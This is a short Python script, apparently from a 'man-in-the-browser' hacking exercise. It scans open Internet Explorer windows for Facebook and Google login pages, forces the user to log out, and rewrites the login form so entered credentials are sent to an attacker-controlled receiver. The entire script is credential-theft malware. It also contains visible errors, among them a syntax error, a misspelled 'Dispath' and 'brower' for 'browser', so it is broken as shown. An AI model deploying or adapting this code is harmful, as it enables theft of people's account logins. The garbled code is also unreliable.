import win32com.client
import time
import urlparse
import urllib

dataReceiver = "http://localhost:8080"

targetSites = {}

targetSites['www.facebook.com'] = {
    "logout_url": None,
    "logout_form": "logout_form",
    "login_form_index": 0,
    "owned": : False
}

targetSites["accounts.google.com"] = {
    "logout_url": "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail",
    "logout_form": None,
    "login_form_index": 0,
    "owned": False
}

targetSites["www.gmail.com"] = targetSites["accounts.google.com"]
targetSites["mail.google.com"] = targetSites["accounts.google.com"]

clsid = '9BA05972-F6A8-11CF-A442-00A0C90A8F39'

windows = win32com.client.Dispath(clsid)


def waitForBrowser(browser):    
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

    return

while True:
    for browser in windows:
        url = urlparse.urlparse(browser.LocationUrl)
        if url.hostname in targetSites:
            if targetSites[url.hostname]["owned"]:
                continue

            if targetSites[url.hostname]["logout_url"]:
                browser.Navigate(targetSites[url.hostname]["logout_url"])
                waitForBrowser(browser)

            else:
                fullDoc = brower.Document.all
                for i in fullDoc:
                    try:
                        if i.id == targetSites[url.hostname]["logout_form"]:
                            i.submit()
                            waitForBrowser(brower)

                    except:
                        pass

            try:
                loginIndex = targetSites[url.hostname]["login_form_index"]
                loginPage = urllib.quote(brower.LocationUrl)
                browser.Document.forms[loginIndex].action = "%s%s" % (dataReceiver, loginPage)
                targetSites[url.hostname]["owned"] = True

            except:
                pass

    time.sleep(5)
